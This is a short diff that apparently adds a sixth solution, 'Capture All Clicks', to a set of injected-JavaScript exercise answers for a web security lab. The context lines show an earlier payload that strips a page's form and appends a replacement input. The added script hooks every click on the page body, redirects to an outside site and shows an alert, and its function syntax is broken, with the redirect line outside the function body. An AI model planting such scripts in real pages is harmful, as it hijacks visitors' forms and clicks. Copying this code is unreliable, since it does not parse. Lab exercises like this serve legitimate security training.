@@ -70,3 +70,19 @@ document.forms[0].parentNode.appendChild(input);
 document.forms[0].parentNode.removeChild(document.forms[0]);
 
 </script>
+
+
+* Solution 6: Capture All Clicks
+
+<script>
+
+function CaughtClick () 
+location.href = "http://PentesterAcademy.com";
+
+{
+	alert("You Clicked");	
+}
+
+document.body.addEventListener('click', CaughtClick, true);
+
+</script>
